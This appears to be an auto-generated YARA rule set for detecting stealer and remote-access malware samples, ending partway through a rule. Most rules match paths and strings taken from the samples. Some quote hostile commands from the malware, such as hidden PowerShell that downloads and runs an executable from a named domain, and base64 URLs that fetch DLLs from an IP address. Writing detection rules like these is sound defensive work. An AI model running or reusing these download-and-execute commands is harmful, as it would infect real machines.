/*
   YARA Rule Set
   Author: Metin Yigit
   Date: 2025-09-28
   Identifier: _subset_batch
   Reference: internal
*/

/* Rule Set ----------------------------------------------------------------- */

import "pe"

rule RustyStealer_signature__b7db3aa302c3126c62a117359cdc6b10_imphash_ {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_b7db3aa302c3126c62a117359cdc6b10(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b61a92af869ce9a7cde7786024ea7256cfce4f3b680b94c8d96e6d81088d3ca2"
   strings:
      $x1 = "C:\\Users\\runneradmin\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\rustc-demangle-0.1.21\\src\\v0.rs" fullword ascii /* score: '33.00'*/
      $x2 = "C:\\Users\\runneradmin\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\hashbrown-0.12.3\\src\\raw\\mod.rs" fullword ascii /* score: '33.00'*/
      $x3 = "C:\\Users\\runneradmin\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\rustc-demangle-0.1.21\\src\\legacy.rs8" fullword ascii /* score: '33.00'*/
      $x4 = "C:\\Users\\marcis\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\hime_redist-3.5.1\\src\\utils\\bin.rs" fullword ascii /* score: '32.00'*/
      $s5 = "C:\\Users\\marcis\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\hime_redist-3.5.1\\src\\utils\\biglist.rs" fullword ascii /* score: '30.00'*/
      $s6 = "C:\\Users\\marcis\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\hime_redist-3.5.1\\src\\parsers\\subtree.rs" fullword ascii /* score: '30.00'*/
      $s7 = "C:\\Users\\marcis\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\hime_redist-3.5.1\\src\\lexers\\automaton.rs" fullword ascii /* score: '30.00'*/
      $s8 = "C:\\Users\\marcis\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\arguments-0.7.1\\src\\parser.rs" fullword ascii /* score: '30.00'*/
      $s9 = "C:\\Users\\marcis\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\hime_redist-3.5.1\\src\\parsers\\lrk.rs" fullword ascii /* score: '30.00'*/
      $s10 = "C:\\Users\\marcis\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\hime_redist-3.5.1\\src\\parsers\\mod.rs" fullword ascii /* score: '30.00'*/
      $s11 = ".llvm.C:\\Users\\runneradmin\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\rustc-demangle-0.1.21\\src\\lib.rs" fullword ascii /* score: '30.00'*/
      $s12 = "C:\\Users\\marcis\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\hime_redist-3.5.1\\src\\lexers\\impls.rs" fullword ascii /* score: '30.00'*/
      $s13 = "L:\\Dev\\priede\\cli\\target\\release\\deps\\priede.pdb" fullword ascii /* score: '29.00'*/
      $s14 = "called `Option::unwrap()` on a `None` valueC:\\Users\\marcis\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\hime_redist-3." ascii /* score: '27.00'*/
      $s15 = "uncategorized errorother errorout of memoryunexpected end of fileunsupportedoperation interruptedargument list too longinvalid f" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule SalatStealer_signature__d59a4a699610169663a929d37c90be43_imphash_ {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_d59a4a699610169663a929d37c90be43(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "34f1c520c451a875b8b19601370083abf25259f01d93648e3cc5216ad8b0ac05"
   strings:
      $s1 = "hostfxr.dll" fullword wide /* score: '28.00'*/
      $s2 = "This executable is not bound to a managed DLL to execute. The binding value is: '%s'" fullword wide /* score: '25.00'*/
      $s3 = "Xeno - Executor UI" fullword wide /* score: '24.00'*/
      $s4 = "XenoUI.dll" fullword wide /* score: '23.00'*/
      $s5 = "D:\\a\\_work\\1\\s\\artifacts\\obj\\win-x64.Release\\corehost\\apphost\\standalone\\apphost.pdb" fullword ascii /* score: '22.00'*/
      $s6 = "The managed DLL bound to this executable is: '%s'" fullword wide /* score: '20.00'*/
      $s7 = "Xeno.exeXenoexecutor.exe1PAD1PAD1PAD1PAD&=O8" fullword ascii /* score: '19.00'*/
      $s8 = "Showing error dialog for application: '%s' - error code: 0x%x - url: '%s' - details: %s" fullword wide /* score: '19.00'*/
      $s9 = "Failed to resolve full path of the current executable [%s]" fullword wide /* score: '18.00'*/
      $s10 = "--- Invoked %s [version: %s] main = {" fullword wide /* score: '18.00'*/
      $s11 = "https://go.microsoft.com/fwlink/?linkid=798306" fullword wide /* score: '17.00'*/
      $s12 = "The managed DLL bound to this executable could not be retrieved from the executable image." fullword wide /* score: '17.00'*/
      $s13 = "https://github.com/Riz-ve/Xeno" fullword wide /* score: '17.00'*/
      $s14 = "Could not load 'kernel32.dll': %u" fullword wide /* score: '16.00'*/
      $s15 = "Download the .NET runtime:" fullword wide /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      8 of them
}

rule SalatStealer_signature__d59a4a699610169663a929d37c90be43_imphash__41feb3e5 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_d59a4a699610169663a929d37c90be43(imphash)_41feb3e5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "41feb3e5043316b1eb0b423b461633b72bd0fd10e795ff2c47afc73058780908"
   strings:
      $x1 = "C:\\Users\\anfisov\\source\\repos\\launch\\x64\\Release\\launch.pdb" fullword ascii /* score: '33.00'*/
      $s2 = "VCRUNTIME140_1.dll" fullword ascii /* score: '23.00'*/
      $s3 = "external.exe" fullword ascii /* score: '22.00'*/
      $s4 = "Portions Copyright (c) 1999,2003 Avenger by NhT" fullword ascii /* score: '9.00'*/
      $s5 = "]=|+} 2'_>9" fullword ascii /* score: '9.00'*/ /* hex encoded string ')' */
      $s6 = "* |//O" fullword ascii /* score: '9.00'*/
      $s7 = "lskwfaa" fullword ascii /* score: '8.00'*/
      $s8 = "%rXZj%^[" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      1 of ($x*) and all of them
}

rule XWorm_signature__84d28702e33e919c459e4ea4475fbc68_imphash_ {
   meta:
      description = "_subset_batch - file XWorm(signature)_84d28702e33e919c459e4ea4475fbc68(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b3741c629723b9dc0da8fa86ab9af776d04ff59b8a6f3f5c3e4b3be5f054b70e"
   strings:
      $x1 = "start /min cmd.exe /c powershell -WindowStyle Hidden -Command \"& { iwr -Uri 'https://pubshierstext.top/Stb/Retev.php?bl=n1SeIVl" ascii /* score: '55.00'*/
      $x2 = "start /min cmd.exe /c powershell -WindowStyle Hidden -Command \"& { iwr -Uri 'https://pubshierstext.top/Stb/Retev.php?bl=n1SeIVl" ascii /* score: '48.00'*/
      $x3 = "7JdJRn9LeVPRE008.txt' -OutFile $env:APPDATA\\BK711717.exe; Start-Process -FilePath $env:APPDATA\\BK711717.exe -WindowStyle Hidde" ascii /* score: '40.00'*/
      $s4 = "powershell -encodedCommand UwBlAHQALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAC0AUwBjAG8AcABlACAAUAByAG8AYwBlAHMAcwAgAC0ARQB4A" ascii /* score: '26.00'*/
      $s5 = "powershell -encodedCommand UwBlAHQALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAC0AUwBjAG8AcABlACAAUAByAG8AYwBlAHMAcwAgAC0ARQB4A" ascii /* score: '26.00'*/
      $s6 = "C:\\Users\\PC\\Desktop\\Yeni klas" fullword ascii /* score: '24.00'*/
      $s7 = "r (2)\\x64\\Release\\MyApp.pdb" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      1 of ($x*) and all of them
}

rule StormKitty_signature__44d8a197c84278da32b54956d7f26e65_imphash_ {
   meta:
      description = "_subset_batch - file StormKitty(signature)_44d8a197c84278da32b54956d7f26e65(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2a2613220f805ec9446b4d266c68b3a04e45cd6beb30d20a01d0675fdbf114e8"
   strings:
      $s1 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s2 = "IUJf:\\ Ux" fullword ascii /* score: '10.00'*/
      $s3 = "maze(11)=%d, (13)=%d, (20)=%d" fullword ascii /* score: '9.50'*/
      $s4 = "4\\b70)^]" fullword ascii /* score: '9.00'*/ /* hex encoded string 'Kp' */
      $s5 = "* '+zo" fullword ascii /* score: '9.00'*/
      $s6 = "<7\\{,d\"" fullword ascii /* score: '9.00'*/ /* hex encoded string '}' */
      $s7 = "[*] noise=%llu time=%lu ms" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 12000KB and
      all of them
}

rule UltraVNC_signature__1d1577d864d2da06952f7affd8635371_imphash_ {
   meta:
      description = "_subset_batch - file UltraVNC(signature)_1d1577d864d2da06952f7affd8635371(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9218598caf39b406b32800c109c5c8ffb6754cd34923b39fb5b0bd4dc498b597"
   strings:
      $x1 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"X86\" pu" ascii /* score: '32.00'*/
      $s2 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"X86\" pu" ascii /* score: '29.00'*/
      $s3 = "RunProgram=\"hidcon:cmd /c  cd %HOMEDRIVE%%HOMEPATH%\\Videos\\ & copy 39155 39155.cmd\"" fullword ascii /* score: '27.00'*/
      $s4 = "RunProgram=\"hidcon:cmd /c  cd %HOMEDRIVE%%HOMEPATH%\\Videos\\ & 39155.cmd\"" fullword ascii /* score: '27.00'*/
      $s5 = "RunProgram=\"hidcon:cmd /c  cd %HOMEDRIVE%%HOMEPATH%\\Videos\\ & copy 9833.Zyx3e3 9833.cmd\"" fullword ascii /* score: '27.00'*/
      $s6 = "RunProgram=\"hidcon:cmd /c  copy /y \\\"%CD%\\*.*\\\" \\\"%HOMEDRIVE%%HOMEPATH%\\Videos\\\\\\\"\"" fullword ascii /* score: '24.00'*/
      $s7 = "<requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivil" ascii /* score: '23.00'*/
      $s8 = "<requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivil" ascii /* score: '23.00'*/
      $s9 = "Tribuna.exe" fullword wide /* score: '22.00'*/
      $s10 = "sfxelevation" fullword wide /* score: '20.00'*/
      $s11 = "Error in command line:" fullword ascii /* score: '15.00'*/
      $s12 = " 7-Zip - Copyright (c) 1999-2011 " fullword ascii /* score: '14.00'*/
      $s13 = "SFX module - Copyright (c) 2005-2012 Oleg Scherbakov" fullword ascii /* score: '14.00'*/
      $s14 = "7-Zip archiver - Copyright (c) 1999-2011 Igor Pavlov" fullword ascii /* score: '14.00'*/
      $s15 = " - Copyright (c) 2005-2012 " fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule YoungLotus_signature__fadd76ef2c914e3919d7c39efa50d468_imphash_ {
   meta:
      description = "_subset_batch - file YoungLotus(signature)_fadd76ef2c914e3919d7c39efa50d468(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8bb748fd1e1789fc03d0ab2b5a27f9f653896e3a467374139b8aabaca3d0e4e1"
   strings:
      $s1 = "__imp_GetWindowThreadProcessId" fullword ascii /* score: '20.00'*/
      $s2 = "uLCxhNkN5" fullword ascii /* base64 encoded string ',,a6Cy' */ /* score: '15.00'*/
      $s3 = "ekcyNXZ7r" fullword ascii /* base64 encoded string 'zG25v{' */ /* score: '14.00'*/
      $s4 = "peEdkekS=" fullword ascii /* base64 encoded string 'xGdzD' */ /* score: '14.00'*/
      $s5 = "PGchPAB8K" fullword ascii /* base64 encoded string '<g!< |' */ /* score: '14.00'*/
      $s6 = "JCchPQB8K" fullword ascii /* base64 encoded string '$'!= |' */ /* score: '14.00'*/
      $s7 = ")rvaTarget" fullword ascii /* score: '14.00'*/
      $s8 = "`aXUtSyw8" fullword ascii /* base64 encoded string 'iu-K,<' */ /* score: '14.00'*/
      $s9 = "jekRQd1oj" fullword ascii /* base64 encoded string 'zDPwZ#' */ /* score: '14.00'*/
      $s10 = "kekRtc1on" fullword ascii /* base64 encoded string 'zDmsZ'' */ /* score: '14.00'*/
      $s11 = "dXJpeCMoe" fullword ascii /* base64 encoded string 'urix#(' */ /* score: '14.00'*/
      $s12 = "TGchPAB8K" fullword ascii /* base64 encoded string 'Lg!< |' */ /* score: '14.00'*/
      $s13 = "dXdraWw8D" fullword ascii /* base64 encoded string 'uwkil<' */ /* score: '14.00'*/
      $s14 = "  VirtualQuery failed for %d bytes at address %p" fullword ascii /* score: '13.00'*/
      $s15 = "ZDLruN2z:\\" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 26000KB and
      8 of them
}

rule SkuldStealer_signature__9ae08c606d843efb92930f7f2907ad40_imphash_ {
   meta:
      description = "_subset_batch - file SkuldStealer(signature)_9ae08c606d843efb92930f7f2907ad40(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "56f604cfc92d76f91f8904fd6dfbcb3a7a775b0d6301461270b50a454f06b0ad"
   strings:
      $s1 = "(SHGetKnownFolderPath/SHBrowseForFolder/IShellLink)," fullword wide /* score: '14.00'*/
      $s2 = "(registry), and comctl32 (TaskDialog/InitCommonControls)." fullword wide /* score: '12.00'*/
      $s3 = "%s\\Contact_Explain.txt" fullword wide /* score: '11.00'*/
      $s4 = "%s\\Contact_Explain Shortcut.lnk" fullword wide /* score: '11.00'*/
      $s5 = "* 7}40&" fullword ascii /* score: '9.00'*/
      $s6 = "It exercises kernel32 (CreateFile/WriteFile)," fullword wide /* score: '9.00'*/
      $s7 = "gegsfaf" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 17000KB and
      all of them
}

rule Stealc_signature__9ae08c606d843efb92930f7f2907ad40_imphash_ {
   meta:
      description = "_subset_batch - file Stealc(signature)_9ae08c606d843efb92930f7f2907ad40(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6e08fc7b1a2dd760d6fa71aa021431b9348a5dbdec50b6af5aac0a8ef58fd327"
   strings:
      $s1 = "(SHGetKnownFolderPath/SHBrowseForFolder/IShellLink)," fullword wide /* score: '14.00'*/
      $s2 = "(registry), and comctl32 (TaskDialog/InitCommonControls)." fullword wide /* score: '12.00'*/
      $s3 = "%s\\Contact_Explain.txt" fullword wide /* score: '11.00'*/
      $s4 = "%s\\Contact_Explain Shortcut.lnk" fullword wide /* score: '11.00'*/
      $s5 = "It exercises kernel32 (CreateFile/WriteFile)," fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      all of them
}

rule Stealc_signature__9ae08c606d843efb92930f7f2907ad40_imphash__9acfadc7 {
   meta:
      description = "_subset_batch - file Stealc(signature)_9ae08c606d843efb92930f7f2907ad40(imphash)_9acfadc7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9acfadc7319deb2b973ea96dcc96600a02e11923699d3d5ad0dabebec3a661dc"
   strings:
      $s1 = "(SHGetKnownFolderPath/SHBrowseForFolder/IShellLink)," fullword wide /* score: '14.00'*/
      $s2 = "(registry), and comctl32 (TaskDialog/InitCommonControls)." fullword wide /* score: '12.00'*/
      $s3 = "%s\\Contact_Explain.txt" fullword wide /* score: '11.00'*/
      $s4 = "%s\\Contact_Explain Shortcut.lnk" fullword wide /* score: '11.00'*/
      $s5 = "It exercises kernel32 (CreateFile/WriteFile)," fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      all of them
}

rule Stealc_signature__d3b8060c77e25bad949642210b0e3d82_imphash_ {
   meta:
      description = "_subset_batch - file Stealc(signature)_d3b8060c77e25bad949642210b0e3d82(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9b65b8935969a153fe8e5cf18ec799e868328bd2ba1f5c6cbc5abfe437fed851"
   strings:
      $s1 = "(SHGetKnownFolderPath/SHBrowseForFolder/IShellLink)," fullword wide /* score: '14.00'*/
      $s2 = "(registry), and comctl32 (TaskDialog/InitCommonControls)." fullword wide /* score: '12.00'*/
      $s3 = "%s\\Contact_Explain.txt" fullword wide /* score: '11.00'*/
      $s4 = "%s\\Contact_Explain Shortcut.lnk" fullword wide /* score: '11.00'*/
      $s5 = "It exercises kernel32 (CreateFile/WriteFile)," fullword wide /* score: '9.00'*/
      $s6 = "<6':&:3!{" fullword ascii /* score: '9.00'*/ /* hex encoded string 'c' */
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      all of them
}

rule Vidar_signature__3c81a2f5f80c3a1210bbf77bb8ca8335_imphash_ {
   meta:
      description = "_subset_batch - file Vidar(signature)_3c81a2f5f80c3a1210bbf77bb8ca8335(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e87152ef68cd00d81c8890079fbb9acd18ad90e6d6568251feda68e5761d76bd"
   strings:
      $s1 = "`%S%Bb" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      all of them
}

rule Vidar_signature__44d8a197c84278da32b54956d7f26e65_imphash_ {
   meta:
      description = "_subset_batch - file Vidar(signature)_44d8a197c84278da32b54956d7f26e65(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "15bcff2e78c4739154eaa724eadece06f8b4955e66becb5412d8a6921df1c481"
   strings:
      $s1 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s2 = "maze(11)=%d, (13)=%d, (20)=%d" fullword ascii /* score: '9.50'*/
      $s3 = "[*] noise=%llu time=%lu ms" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule ValleyRAT_signature__adace12c308396fa8bfa05665e1424aa_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_adace12c308396fa8bfa05665e1424aa(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ee6810a5bc6b8e85bcd2936558b2816773ebf57693eab4b639cdb04657d54c26"
   strings:
      $x1 = "cmd /c start \"\" \"C:\\Program Files (x86)\\FreeCountdownTimer.exe" fullword ascii /* score: '37.00'*/
      $s2 = "ping www.baidu.com&del /f  szCommandLine" fullword ascii /* score: '30.00'*/
      $s3 = "C:\\Program Files (x86)\\basswma.dll" fullword ascii /* score: '26.00'*/
      $s4 = "C:\\Program Files (x86)\\bass.dll" fullword ascii /* score: '26.00'*/
      $s5 = "C:\\Program Files (x86)\\bassflac.dll" fullword ascii /* score: '26.00'*/
      $s6 = "C:\\Program Files (x86)\\debug.log" fullword ascii /* score: '22.00'*/
      $s7 = "C:\\Program Files (x86)\\FreeCountdownTimer.exe" fullword ascii /* score: '21.00'*/
      $s8 = "Win32.exe" fullword ascii /* score: '19.00'*/
      $s9 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.VC90.CRT\" version=\"9.0.21022.8\" processorArchitecture=\"x86\" publicK" ascii /* score: '18.00'*/
      $s10 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.VC90.CRT\" version=\"9.0.21022.8\" processorArchitecture=\"x86\" publicK" ascii /* score: '18.00'*/
      $s11 = "F:\\BaiduNetdiskDownload\\" fullword ascii /* score: '16.00'*/
      $s12 = "\\Release\\Win32.pdb" fullword ascii /* score: '14.00'*/
      $s13 = "aHR0cDovLzE0OS44OC42Ni45ODozMzY1L2Jhc3NmbGFjLmRsbA==" fullword ascii /* base64 encoded string 'http://149.88.66.98:3365/bassflac.dll' */ /* score: '14.00'*/
      $s14 = "aHR0cDovLzE0OS44OC42Ni45ODozMzY1L2Jhc3MuZGxs" fullword ascii /* base64 encoded string 'http://149.88.66.98:3365/bass.dll' */ /* score: '14.00'*/
      $s15 = "aHR0cDovLzE0OS44OC42Ni45ODozMzY1L2RlYnVnLmxvZw==" fullword ascii /* base64 encoded string 'http://149.88.66.98:3365/debug.log' */ /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule SalatStealer_signature__69e7957ebc4546ed7a08366d457acaae_imphash_ {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_69e7957ebc4546ed7a08366d457acaae(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b9d9d2bae3470e2048cd3880af2a5063c04ce64553b0fc856edaf2b70220c05c"
   strings:
      $s1 = "maze(11)=%d, (13)=%d, (20)=%d" fullword ascii /* score: '9.50'*/
      $s2 = "* /0)s" fullword ascii /* score: '9.00'*/
      $s3 = "FtpLwF~" fullword ascii /* score: '9.00'*/
      $s4 = "* z~0w" fullword ascii /* score: '9.00'*/
      $s5 = "2 - *9$" fullword ascii /* score: '9.00'*/
      $s6 = "[*] noise=%llu time=%lu ms" fullword ascii /* score: '8.00'*/
      $s7 = "gxolcll" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 13000KB and
      all of them
}

rule XenoRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file XenoRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "384afed09f41f19ce3b378a5e8955c13e8f5ba54ec0b6682a88fe45f42ddd9d1"
   strings:
      $s1 = "xeno rat client.exe" fullword wide /* score: '24.00'*/
      $s2 = "Xeno_manager.exe" fullword wide /* score: '19.00'*/
      $s3 = "mutex_string" fullword ascii /* score: '15.00'*/
      $s4 = "<process>5__3" fullword ascii /* score: '15.00'*/
      $s5 = "<getdll>5__2" fullword ascii /* score: '14.00'*/
      $s6 = "/xeno_rat_client.DllHandler+<DllNodeHandler>d__3" fullword ascii /* score: '13.00'*/
      $s7 = "GetWindowsVersion" fullword ascii /* score: '12.00'*/
      $s8 = "_EncryptionKey" fullword ascii /* score: '12.00'*/
      $s9 = "/query /v /fo csv" fullword wide /* score: '12.00'*/
      $s10 = "                <Task xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'>" fullword wide /* score: '12.00'*/
      $s11 = "<tempXmlFile>5__2" fullword ascii /* score: '11.00'*/
      $s12 = "xeno rat client" fullword wide /* score: '11.00'*/
      $s13 = "                    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>" fullword wide /* score: '11.00'*/
      $s14 = ".NETFramework,Version=v4.8" fullword ascii /* score: '10.00'*/
      $s15 = ".NET Framework 4.8" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      8 of them
}

rule Vidar_signature__fb17f756aa2b1bc258b09373a8db78bf_imphash_ {
   meta:
      description = "_subset_batch - file Vidar(signature)_fb17f756aa2b1bc258b09373a8db78bf(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0311bd5c700fc5d4f73036c539dbbaca8ce32398eaae6faf933341f70cecfffb"
   strings:
      $s1 = "Screenshoter.exe" fullword wide /* score: '22.00'*/
      $s2 = "SWSSSSSSSSVS" fullword ascii /* reversed goodware string 'SVSSSSSSSSWS' */ /* score: '16.50'*/
      $s3 = "Screenshoter: Screen Uploader" fullword wide /* score: '15.00'*/
      $s4 = "AppPolicyGetThreadInitializationType" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__c63caf60 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c63caf60.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c63caf60058b17c399a5bbae72d7386cf5cbac4095e943ba3d1f1f578a1fab2d"
   strings:
      $s1 = "Intasuranfe.exe" fullword wide /* score: '22.00'*/
      $s2 = "PENDIENTE" fullword wide /* base64 encoded string '<CC CS' */ /* score: '16.50'*/
      $s3 = "SELECT test.TES_ID, CASE when TES_TIPO = 'Examen' then  ('** ' + TES_NOMBRE + ' **') when TES_TIPO = 'Parametro' then  ('  --> '" wide /* score: '16.00'*/
      $s4 = "http://ocsp.digicert.com0X" fullword ascii /* score: '14.00'*/
      $s5 = "Lhttp://cacerts.digicert.com/DigiCertTrustedG4RSA4096SHA256TimeStampingCA.crt0" fullword ascii /* score: '13.00'*/
      $s6 = "Ihttp://crl3.digicert.com/DigiCertTrustedG4RSA4096SHA256TimeStampingCA.crl0" fullword ascii /* score: '13.00'*/
      $s7 = "/http://crl4.digicert.com/sha2-assured-cs-g1.crl0K" fullword ascii /* score: '13.00'*/
      $s8 = "select test.TES_ID, CASE when TES_TIPO = 'Examen' then  ('** ' + TES_NOMBRE + ' **') when TES_TIPO = 'Parametro' then  ('  --> '" wide /* score: '13.00'*/
      $s9 = "DigiCert Timestamp 2022 - 20" fullword ascii /* score: '12.00'*/
      $s10 = "delete from i_temp_stock;" fullword wide /* score: '11.00'*/
      $s11 = "Insert into i_temp_stock values ('" fullword wide /* score: '11.00'*/
      $s12 = "select * from tipo_autocompletar where auto_nombre = '" fullword wide /* score: '11.00'*/
      $s13 = "System.Windows.Forms.Form" fullword ascii /* score: '10.00'*/
      $s14 = "AUTOCOMPLETE" fullword wide /* score: '9.50'*/
      $s15 = "COMENTARIO" fullword wide /* score: '9.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule ThemeForestRAT_signature__1c56888e3a32873a957665cac4e85718_imphash_ {
   meta:
      description = "_subset_batch - file ThemeForestRAT(signature)_1c56888e3a32873a957665cac4e85718(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c66ba5c68ba12eaf045ed415dfa72ec5d7174970e91b45fda9ebb32e0a37784a"
   strings:
      $x1 = "C:\\Windows\\System32\\wmisvc.dll" fullword ascii /* score: '34.00'*/
      $x2 = " unzip 1.01 Copyright 1998-2004 Gilles Vollant - http://www.winimage.com/zLibDll" fullword ascii /* score: '32.00'*/
      $s3 = "c:\\Windows\\Temp\\log.txt" fullword ascii /* score: '29.00'*/
      $s4 = "C:\\Windows\\System32\\wmulock" fullword ascii /* score: '18.00'*/
      $s5 = "The encoded URL is not valid." fullword wide /* score: '16.00'*/
      $s6 = "::GetFileSize failed (\"%s\")." fullword wide /* score: '15.00'*/
      $s7 = "Thumb_%s_%05d.png" fullword wide /* score: '14.00'*/
      $s8 = "ThemeForest_%s_%05d.png" fullword wide /* score: '14.00'*/
      $s9 = "TMP69423A.TMP" fullword wide /* score: '14.00'*/
      $s10 = "vssec.dat" fullword wide /* score: '14.00'*/
      $s11 = "CHttpResponseT::GetContentLength: m_hRequest can not be NULL." fullword wide /* score: '13.00'*/
      $s12 = "AppPolicyGetThreadInitializationType" fullword ascii /* score: '12.00'*/
      $s13 = "::HttpAddRequestHeaders failed." fullword wide /* score: '12.00'*/
      $s14 = ".?AV?$CHttpPostStatT@VCHttpToolW@Ryeol@@@Ryeol@@" fullword ascii /* score: '12.00'*/
      $s15 = "CHttpPostStatT::ActualTotalByte: The post context is not active." fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      1 of ($x*) and 4 of them
}

rule ValleyRAT_signature__ce09579c3721886d9041e964bc6aebf4_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_ce09579c3721886d9041e964bc6aebf4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b9aca889853b42acbe3236f2f610f32298a00af9c55ee5d3fef562dacee48f97"
   strings:
      $x1 = "<assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\" xmlns:asmv3=\"urn:schemas-microsoft-com:asm.v3\"><a" ascii /* score: '50.00'*/
      $x2 = "iscsiexe.dll" fullword wide /* reversed goodware string 'lld.exeiscsi' */ /* score: '33.00'*/
      $s3 = "\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"fals" ascii /* score: '26.00'*/
      $s4 = "wow64log.dll" fullword wide /* score: '25.00'*/
      $s5 = "computerdefaults.exe" fullword wide /* score: '25.00'*/
      $s6 = "ency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" publicKe" ascii /* score: '24.00'*/
      $s7 = "Akagi32.dll" fullword ascii /* score: '23.00'*/
      $s8 = "BluetoothDiagnosticUtil.dll" fullword wide /* score: '23.00'*/
      $s9 = "loginconfig" fullword ascii /* score: '22.00'*/
